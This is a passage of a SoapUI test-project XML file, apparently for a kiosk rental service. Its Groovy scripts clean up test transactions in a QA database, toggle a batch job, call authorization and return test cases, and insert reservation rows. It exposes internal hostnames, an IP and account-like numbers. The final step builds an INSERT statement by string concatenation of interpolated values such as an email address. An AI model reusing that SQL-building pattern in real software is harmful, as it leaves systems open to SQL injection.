		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
			if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("SuccessCount",(testRunner.testCase.getPropertyValue("SuccessCount").toShort() + 1 ).toString());
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="3f0f233e-69fe-4325-87b9-fb06ddd2b07f"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="4a2b1c25-b612-4669-bd3c-caa36be75398"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Reset properties
testRunner.testCase.setPropertyValue("SuccessCount","0");
testRunner.testCase.setPropertyValue("FailCount","0");
testRunner.testCase.setPropertyValue("TotalScenarioCount","0");

//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,264389) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM TransactionDiscount WHERE TransactionId = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,264389)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983225</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058311</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">75527813105188</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Pickup PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>22</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:38:17.210</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:40:27.358</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648734</con:value></con:property><con:property><con:name>AccountNumber</con:name><con:value>81461737632253</con:value></con:property><con:property><con:name>SuccessCount</con:name><con:value>19</con:value></con:property><con:property><con:name>FailCount</con:name><con:value>0</con:value></con:property><con:property><con:name>TotalScenarioCount</con:name><con:value>0</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>22</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>5a35d39d-4f88-4217-bf3a-f3cebdc33ac5</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="64b21cfd-d659-4a6f-a5a4-294758c1e269" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="KioskService-AuthFailures-ROP" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword=""><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="292e6cc0-e172-4ce3-b41f-a504ecebb0ce"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="63e26fcc-dece-4623-b15e-0feb2a57c25b"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_AuthFailures_new.ID As ID, 
	KS_AuthFailures_new.Scenario As Scenario,
	KS_AuthFailures_new.Email As Email, 
	KS_AuthFailures_new.CreditCardNumber As Ccnumber,
	KS_AuthFailures_new.CreditCardType As CCType, 
	KS_AuthFailures_new.PromoCode As PromotionCode, 
	KS_AuthFailures_new.PromoValue As PromoValue,
	KS_AuthFailures_new.KioskID As KioskID, 
	KS_AuthFailures_new.RentalFormats As rentalFormats, 
	KS_AuthFailures_new.NumberOfRentals As numOfRentals,
	KS_AuthFailures_new.RentalVendStatus As RentalVendStatus,
	KS_AuthFailures_new.PurchaseFormats As PurchaseFormats,
	KS_AuthFailures_new.NumberOfPurchases As numOfPurchases,
	KS_AuthFailures_new.PurchaseVendStatus As PurchaseVendStatus,
	KS_AuthFailures_new.SetDaysBack As SetDaysBack, 
	KS_AuthFailures_new.IsOffline As IsOffline, 
	KS_AuthFailures_new.LoyaltyFlag As LoyaltyFlag,
	KS_AuthFailures_new.IsNewCustomer As IsNewCustomer, 
	KS_AuthFailures_new.IsBlacklist As IsBlacklist, 
	KS_AuthFailures_new.BlacklistTypeID As BlacklistTypeID,
	KS_AuthFailures_new.BlacklistValue As BlacklistValue,
	KS_AuthFailures_new.CustomerStatus As CustomerStatus,
	KS_AuthFailures_new.CustomerActive As CustomerActive, 
	KS_AuthFailures_new.IsRentOnly As IsRentOnly, 
	KS_AuthFailures_new.ErrorMessage As ErrorMessage,
	KS_AuthFailures_new.RecoFormats  As RecoFormats, 
	KS_AuthFailures_new.NumOfRecos As NumOfRecos, 
	KS_AuthFailures_new.RecoVendStatus As RecoVendStatus
From KS_AuthFailures_new
--Created a manual scenarios below.
Where ID in (26,27)</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromotionCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:property>IsNewCustomer</con:property><con:property>IsBlacklist</con:property><con:property>BlacklistTypeID</con:property><con:property>BlacklistValue</con:property><con:property>CustomerStatus</con:property><con:property>CustomerActive</con:property><con:property>IsRentOnly</con:property><con:property>ErrorMessage</con:property><con:property>recoFormats</con:property><con:property>numOfRecos</con:property><con:property>RecoVendStatus</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="d03cd0f1-80a4-4208-8d49-022f0e9ebd24"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
def Scenario = context.expand( '${DataSource#Scenario}' );
log.info ("--------------------------" + context.testCase.name + "-------------------------");
log.info ("Scenario [$ScenarioNo]: " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
testRunner.testCase.setPropertyValue("CustomerID",CustomerID.toString());
testRunner.testCase.setPropertyValue("CardAccountId",getCP.getPropertyValue("CardAccountId"));
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
//log.info ("CustomerID : $CustomerID");
/*
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

*/

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="ff2a5376-b38a-4560-ab82-9588375b9210"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("MDVFlag", '');
tc.setPropertyValue("MDVDiscNumber",'');

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="14c979f8-0fc4-4491-b750-13457a75704a"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

